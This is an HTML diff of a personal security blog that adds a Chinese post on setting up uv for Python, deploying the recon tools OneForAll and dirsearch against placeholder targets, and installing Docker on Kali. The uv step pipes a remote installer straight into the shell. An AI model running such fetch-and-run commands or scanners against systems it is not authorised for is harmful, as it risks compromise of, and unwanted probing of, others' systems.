@@ -176,18 +176,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-count">52</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -212,6 +212,357 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/08/20/tools/2026-08-22-basic-tools/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/20/tools/2026-08-22-basic-tools/" class="post-title-link" itemprop="url">Basic-Tools</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-08-20 22:00:00" itemprop="dateCreated datePublished" datetime="2026-08-20T22:00:00+08:00">2026-08-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-08-22 21:15:53" itemprop="dateModified" datetime="2026-08-22T21:15:53+08:00">2026-08-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/tools/" itemprop="url" rel="index"><span itemprop="name">tools</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/tools/basic-tools/" itemprop="url" rel="index"><span itemprop="name">basic-tools</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: Kali Ubuntu Windows</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>摘要: 本文详细分析当下工具集最优管理链路, 从原理到实战部署, 0到1完整复现</p>
+</blockquote>
+<h2 id="1-0-uv管理Python"><a href="#1-0-uv管理Python" class="headerlink" title="1.0 uv管理Python"></a>1.0 uv管理Python</h2><h4 id="1-1-为什么选择uv"><a href="#1-1-为什么选择uv" class="headerlink" title="1.1 为什么选择uv?"></a>1.1 为什么选择uv?</h4><ul>
+<li>极速: Rust内核, 比传统pip快10倍以上</li>
+<li>多版本切换平滑</li>
+<li>强隔离性, 项目环境独立</li>
+<li>兼容性: 完全兼容pip</li>
+<li>跨平台: Linux &#x2F; macOS &#x2F; Windows</li>
+</ul>
+<h4 id="1-2-uv安装"><a href="#1-2-uv安装" class="headerlink" title="1.2 uv安装"></a>1.2 uv安装</h4><blockquote>
+<p>备注:  以下操作演示均在Linux-Kali</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On macOS and Linux.</span></span><br><span class="line">curl -LsSf https://astral.sh/uv/install.sh | sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On Windows.</span></span><br><span class="line">powershell -ExecutionPolicy ByPass -c <span class="string">&quot;irm https://astral.sh/uv/install.ps1 | iex&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>网络问题可以考虑代理或二进制安装方式</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 验证是否正确安装</span></span><br><span class="line">uv --version</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/1-1.png"></p>
+<hr>
+<h4 id="1-3-uv安装python"><a href="#1-3-uv安装python" class="headerlink" title="1.3 uv安装python"></a>1.3 uv安装python</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看可用版本</span></span><br><span class="line">uv python list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装指定版本</span></span><br><span class="line">uv python install 3.10</span><br><span class="line"><span class="comment"># 多版本安装</span></span><br><span class="line">uv python install 3.10 3.11 3.12 ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看已安装版本</span></span><br><span class="line">uv python list --only-installed</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="1-4-uv中的Python管理"><a href="#1-4-uv中的Python管理" class="headerlink" title="1.4 uv中的Python管理"></a>1.4 uv中的Python管理</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python解释器本体安装位置</span></span><br><span class="line">/home/kali/.local/share/uv/python/</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/1-2.png"></p>
+<blockquote>
+<p>Python解释器本体默认在该目录</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二进制软连接位置</span></span><br><span class="line">/home/kali/.local/bin/</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/1-3.png"></p>
+<blockquote>
+<p>以上uv主程序和uvx(uv的软连接) 及Python软连接(指向实际解释器位置)</p>
+</blockquote>
+<hr>
+<h4 id="1-5-uv指令集"><a href="#1-5-uv指令集" class="headerlink" title="1.5 uv指令集"></a>1.5 uv指令集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础python模块</span></span><br><span class="line">uv --version                     <span class="comment"># 查看版本</span></span><br><span class="line">uv python list                   <span class="comment"># 查看可下载Python版本</span></span><br><span class="line">uv python list --only-installed  <span class="comment"># 查看本地已安装好的uv托管Python</span></span><br><span class="line">uv python install 3.9 3.10 3.12  <span class="comment"># 一次性安装多版本</span></span><br><span class="line">uv python uninstall 3.9          <span class="comment"># 卸载某个版本</span></span><br><span class="line">uv python pin 3.12               <span class="comment"># 在项目目录锁定本项目使用Python版本, 生成 =&gt; &lt;.python‑version&gt;</span></span><br><span class="line">uv python show                   <span class="comment"># 查看当前项目锁定的Python版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 项目管理模块</span></span><br><span class="line">uv init                          <span class="comment"># 项目初始化, 生成pyproject.toml</span></span><br><span class="line">uv venv                          <span class="comment"># 创建虚拟环境(读取 .python‑version, 使用pin锁定的版本)</span></span><br><span class="line">uv pip list                      <span class="comment"># 列出当前虚拟环境已安装包</span></span><br><span class="line">uv add requests numpy            <span class="comment"># 添加依赖(写入pyproject.toml, 同步锁定uv.lock)</span></span><br><span class="line">uv remove requests               <span class="comment"># 卸载包</span></span><br><span class="line">uv <span class="built_in">sync</span>                          <span class="comment"># 安装pyproject.toml/lock里全部依赖(克隆别人项目用)</span></span><br><span class="line">uv lock --upgrade                <span class="comment"># 更新全部依赖到允许的最新版本</span></span><br><span class="line">uv pip freeze &gt; requirements.txt <span class="comment"># 导出依赖requirements.txt</span></span><br><span class="line">uv pip install -r requirements.txt <span class="comment"># 从requirements.txt安装</span></span><br><span class="line">uv run main.py                   <span class="comment"># 运行程序</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-6-uv实战"><a href="#1-6-uv实战" class="headerlink" title="1.6 uv实战"></a>1.6 uv实战</h4><h5 id="案例1"><a href="#案例1" class="headerlink" title="案例1:"></a>案例1:</h5><blockquote>
+<p>基于uv部署OneForAll</p>
+<p>备注: 该项目非uv构建, 采用<code>requirements.txt</code>文件依赖</p>
+</blockquote>
+<p>01 项目下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/shmilylty/OneForAll.git</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>OneForAll 官方推荐 ≤ 3.9, 依赖库 <code>aiodns</code> 在高版本有兼容问题</p>
+</blockquote>
+<p>02 Python版本指定</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到 OneForAll 工具目录 /home/kali/tools/OneForAll</span></span><br><span class="line">uv python pin 3.9</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此时项目目录下会生成文件<code>.python-version</code></p>
+</blockquote>
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/1-4.png"></p>
+<p>03 虚拟环境创建</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 虚拟环境创建</span></span><br><span class="line">uv venv</span><br></pre></td></tr></table></figure>
+
+<p>04 依赖导入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uv pip install -r requirements.txt</span><br><span class="line">uv pip list <span class="comment"># 查看项目依赖</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/1-5.png"></p>
+<p>05 项目运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv run oneforall.py --target www.xxx.com run</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意: uv运行项目激活虚拟环境非必须</p>
+<p><code>uv run</code>会自动化查找当前目录下<code>.venv</code>并使用解释器, 无需手动激活</p>
+</blockquote>
+<hr>
+<h5 id="案例2"><a href="#案例2" class="headerlink" title="案例2:"></a>案例2:</h5><blockquote>
+<p>基于uv部署dirsearch [源码方案]</p>
+<p>最新源码包含<code>pyproject.toml</code>可实现快速部署</p>
+</blockquote>
+<p>01 Python版本指定</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv python pin 3.14</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/2-1.png"></p>
+<p>02 项目构建</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv <span class="built_in">sync</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>一行命令即可构建整个项目</p>
+</blockquote>
+<p>03 项目运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv run dirsearch.py -u http://xxx -e*</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h5 id="案例3"><a href="#案例3" class="headerlink" title="案例3:"></a>案例3:</h5><blockquote>
+<p>手动项目实战</p>
+</blockquote>
+<p><strong>流程:</strong></p>
+<ul>
+<li><p>本地新建项目<code>test</code>写入<code>main.py</code></p>
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/3-1.png"></p>
+</li>
+<li><p>绑定Python版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv python pin 3.9</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/3-2.png"></p>
+<blockquote>
+<p>指定python版本后自动生成<code>.python-version</code></p>
+</blockquote>
+</li>
+<li><p>项目初始化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv init</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/3-3.png"></p>
+<blockquote>
+<p>生成如上文件(选中部分)</p>
+</blockquote>
+</li>
+<li><p>创建虚拟环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv venv</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行main.py</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv run main.py</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/3-4.png"></p>
+</li>
+<li><p>验证代码分发流程</p>
+<ul>
+<li>删除<code>.venv</code>内容 → 获得源码</li>
+<li>对获取的源码执行<code>uv sync</code> → 自动创建虚拟环境和依赖构建(基于<code>pyproject.toml</code> <code>uv.lock</code>)</li>
+</ul>
+</li>
+</ul>
+<p><strong>补充:</strong></p>
+<ul>
+<li>虚拟环境<ul>
+<li>激活: <code>source .venv/bin/activate</code></li>
+<li>关闭: <code>deactivate</code></li>
+<li>运行程序: <code>python xxx.py</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="2-0-Docker-容器管理"><a href="#2-0-Docker-容器管理" class="headerlink" title="2.0 Docker 容器管理"></a>2.0 Docker 容器管理</h2><h4 id="2-1-为什么选择Docker"><a href="#2-1-为什么选择Docker" class="headerlink" title="2.1 为什么选择Docker?"></a>2.1 为什么选择Docker?</h4><ul>
+<li>环境隔离</li>
+<li>轻量</li>
+<li>快速</li>
+<li>可移植性</li>
+</ul>
+<h4 id="2-2-Docker-部署"><a href="#2-2-Docker-部署" class="headerlink" title="2.2 Docker 部署"></a>2.2 Docker 部署</h4><blockquote>
+<p>备注:  以下操作演示均在Linux-Kali, 与Ubuntu部署有细微差距</p>
+</blockquote>
+<p>01 安装依赖</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install -y ca-certificates curl gnupg</span><br><span class="line"><span class="comment"># &gt;&gt; ca-certificates: HTTPS 通信所需的 CA 证书包, 没有它 curl 无法验证 SSL</span></span><br><span class="line"><span class="comment"># &gt;&gt; curl: 下载 GPG 密钥和后续操作的网络工具</span></span><br><span class="line"><span class="comment"># &gt;&gt; gnupg: GPG 密钥管理工具, 用于将下载的密钥转换为 apt 可识别的格式</span></span><br></pre></td></tr></table></figure>
+
+<p>02 创建密钥目录</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> install -m 0755 -d /etc/apt/keyrings</span><br><span class="line"><span class="comment"># &gt;&gt; /etc/apt/keyrings/ 是 Debian 12+ 推荐的 GPG 密钥存放目录</span></span><br><span class="line"><span class="comment"># &gt;&gt; -m 0755: 目录权限 rwxr-xr-x (所有者可写, 其他人只读)</span></span><br><span class="line"><span class="comment"># &gt;&gt; -d: 仅创建目录, 不复制文件</span></span><br></pre></td></tr></table></figure>
+
+<p>03 下载GPG密钥</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg -o /tmp/docker.gpg</span><br><span class="line"><span class="comment"># &gt;&gt; -f: 失败时静默退出 (不输出 HTML 错误页面)</span></span><br><span class="line"><span class="comment"># &gt;&gt; -s: 静默模式 (不显示进度条)</span></span><br><span class="line"><span class="comment"># &gt;&gt; -S: 配合 -s 使用, 出错时仍显示错误信息</span></span><br><span class="line"><span class="comment"># &gt;&gt; -L: 跟随 HTTP 重定向</span></span><br><span class="line"><span class="comment"># &gt;&gt; 从阿里云镜像下载 Docker 官方 GPG 公钥 (ASCII  armored 格式)</span></span><br><span class="line"><span class="comment"># &gt;&gt; 这个密钥用于验证后续从 Docker 源下载的包是否被篡改</span></span><br></pre></td></tr></table></figure>
+
+<p>04 转换密钥格式</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gpg --dearmor -o /etc/apt/keyrings/docker.gpg /tmp/docker.gpg</span><br><span class="line"><span class="comment"># &gt;&gt; --dearmor: 将 ASCII armored 格式 (.asc) 转换为二进制格式 (.gpg)</span></span><br><span class="line"><span class="comment"># &gt;&gt;   apt 只认二进制格式的 GPG 密钥, ASCII 格式会报错</span></span><br><span class="line"><span class="comment"># &gt;&gt;   这是最容易踩坑的一步, 很多人忘了 dearmor 导致 apt update 报</span></span><br><span class="line"><span class="comment"># &gt;&gt;   &quot;NO_PUBKEY&quot; 或 &quot;invalid signature&quot; 错误</span></span><br><span class="line"><span class="comment"># &gt;&gt; 输入: /tmp/docker.gpg (ASCII 格式)</span></span><br><span class="line"><span class="comment"># &gt;&gt; 输出: /etc/apt/keyrings/docker.gpg (二进制格式)</span></span><br></pre></td></tr></table></figure>
+
+<p>05 设置密钥权限</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="line"><span class="comment"># &gt;&gt; a+r: 所有用户可读 (apt update 以 _apt 用户身份运行, 需要读权限)</span></span><br><span class="line"><span class="comment"># &gt;&gt; 如果不设置, apt update 会报 &quot;Permission denied&quot; 无法读取密钥</span></span><br></pre></td></tr></table></figure>
+
+<p>06 临时文件清理</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /tmp/docker.gpg</span><br><span class="line"><span class="comment"># &gt;&gt; -f: 文件不存在也不报错</span></span><br><span class="line"><span class="comment"># &gt;&gt; 清理步骤 03 下载的 ASCII 格式临时文件, 已不需要</span></span><br></pre></td></tr></table></figure>
+
+<p>07 写入Docker镜像源</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.aliyun.com/docker-ce/linux/debian bookworm stable&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># &gt;&gt; 拆解这条命令:</span></span><br><span class="line"><span class="comment"># &gt;&gt; deb                          → 二进制包源 (区别于 deb-src 源码包)</span></span><br><span class="line"><span class="comment"># &gt;&gt; [arch=$(dpkg --print-architecture)]  → 自动检测 CPU 架构</span></span><br><span class="line"><span class="comment"># &gt;&gt;   amd64 / arm64 / armhf 等, 避免在 ARM 设备上拉 x86 包</span></span><br><span class="line"><span class="comment"># &gt;&gt; signed-by=/etc/apt/keyrings/docker.gpg  → 指定验证此源的 GPG 密钥</span></span><br><span class="line"><span class="comment"># &gt;&gt;   精确绑定: 只有用这个密钥签名的包才被信任, 防止中间人攻击</span></span><br><span class="line"><span class="comment"># &gt;&gt; https://mirrors.aliyun.com/docker-ce/linux/debian  → 阿里云 Docker CE 镜像</span></span><br><span class="line"><span class="comment"># &gt;&gt; bookworm                     → Debian 12 代号, Kali 基于 Debian, 必须用这个</span></span><br><span class="line"><span class="comment"># &gt;&gt; 不要用 jammy (Ubuntu 22.04) 或 noble (Ubuntu 24.04), 会报 Release file not found</span></span><br><span class="line"><span class="comment"># &gt;&gt; stable                       → 稳定版通道 (另有 test / nightly 通道)</span></span><br><span class="line"><span class="comment"># &gt;&gt;</span></span><br><span class="line"><span class="comment"># &gt;&gt; | sudo tee ...               → 用 tee 写入需要 root 权限的文件</span></span><br><span class="line"><span class="comment"># &gt;&gt;   比 sudo echo &quot;...&quot; &gt; file 更可靠 (后者重定向不受 sudo 保护)</span></span><br></pre></td></tr></table></figure>
+
+<p>08 验证源</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list.d/docker.list</span><br><span class="line"><span class="comment"># &gt;&gt; 确认写入内容正确, 应该看到一行 deb 开头的源地址</span></span><br><span class="line"><span class="comment"># &gt;&gt; 如果有拼写错误或换行问题, 后续 apt update 会失败</span></span><br></pre></td></tr></table></figure>
+
+<p>09 刷新apt缓存</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="comment"># &gt;&gt; 从新添加的 Docker 源下载包索引</span></span><br><span class="line"><span class="comment"># &gt;&gt; 如果这一步报错, 99% 是以下原因之一:</span></span><br><span class="line"><span class="comment"># &gt;&gt;   1. GPG 密钥未 dearmor (步骤 04)</span></span><br><span class="line"><span class="comment"># &gt;&gt;   2. 密钥权限不对 (步骤 05)</span></span><br><span class="line"><span class="comment"># &gt;&gt;   3. 源地址中的发行版代号错误 (步骤 07)</span></span><br><span class="line"><span class="comment"># &gt;&gt;   4. 网络不通 / 阿里云镜像暂时不可用</span></span><br></pre></td></tr></table></figure>
+
+<p>10 安装Docker</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br><span class="line"><span class="comment"># &gt;&gt; 五个包的作用:</span></span><br><span class="line"><span class="comment"># &gt;&gt;</span></span><br><span class="line"><span class="comment"># &gt;&gt; docker-ce              → Docker 引擎本体 (Community Edition)</span></span><br><span class="line"><span class="comment"># &gt;&gt; docker-ce-cli          → Docker 命令行客户端 (docker 命令)</span></span><br><span class="line"><span class="comment"># &gt;&gt; containerd.io          → 容器运行时 (Docker 底层实际干活的组件)</span></span><br><span class="line"><span class="comment"># &gt;&gt; docker-buildx-plugin   → 多架构镜像构建工具 (docker buildx 命令)</span></span><br><span class="line"><span class="comment"># &gt;&gt; docker-compose-plugin  → Compose V2 插件 (docker compose 命令, 空格写法)</span></span><br></pre></td></tr></table></figure>
+
+<p>11 启动Docker</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> docker    <span class="comment"># 开机自启</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl start docker     <span class="comment"># 立即启动</span></span><br><span class="line"><span class="comment"># &gt;&gt; enable: 创建 systemd 软链接, 开机自动启动 docker.service</span></span><br><span class="line"><span class="comment"># &gt;&gt; start:  立即启动 Docker 守护进程 (dockerd)</span></span><br></pre></td></tr></table></figure>
+
+<p>12 免sudo配置</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$USER</span></span><br><span class="line"><span class="comment"># &gt;&gt; -a: append 追加 (不覆盖已有组)</span></span><br><span class="line"><span class="comment"># &gt;&gt; -G docker: 将当前用户加入 docker 组</span></span><br><span class="line"><span class="comment"># &gt;&gt; $USER: 当前登录用户名 (kali)</span></span><br><span class="line">newgrp docker                   <span class="comment"># 当前终端立即生效</span></span><br></pre></td></tr></table></figure>
+
+<p>13 配置镜像加速 &amp; 日志限制</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://docker.xuanyuan.me&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://docker.m.daocloud.io&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;log-driver&quot;</span>: <span class="string">&quot;json-file&quot;</span>,</span><br><span class="line">  <span class="string">&quot;log-opts&quot;</span>: &#123; <span class="string">&quot;max-size&quot;</span>: <span class="string">&quot;100m&quot;</span>, <span class="string">&quot;max-file&quot;</span>: <span class="string">&quot;3&quot;</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>14 重启生效</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload    <span class="comment"># 重载 systemd 配置</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker   <span class="comment"># 重启 Docker 使 daemon.json 生效</span></span><br></pre></td></tr></table></figure>
+
+<p>15 验证</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version                  <span class="comment"># 查看 Client + Server 版本信息</span></span><br><span class="line">docker compose version          <span class="comment"># 确认 Compose V2 插件已安装</span></span><br><span class="line">docker run --<span class="built_in">rm</span> hello-world     <span class="comment"># 拉取并运行测试容器, --rm 运行完自动删除</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="2-3-关键配置文件详解"><a href="#2-3-关键配置文件详解" class="headerlink" title="2.3 关键配置文件详解"></a>2.3 关键配置文件详解</h4><p><code>/etc/docker/daemon.json</code></p>
+<p><img data-src="/2026/08/20/tools/2026-08-22-basic-tools/daemon.png"></p>
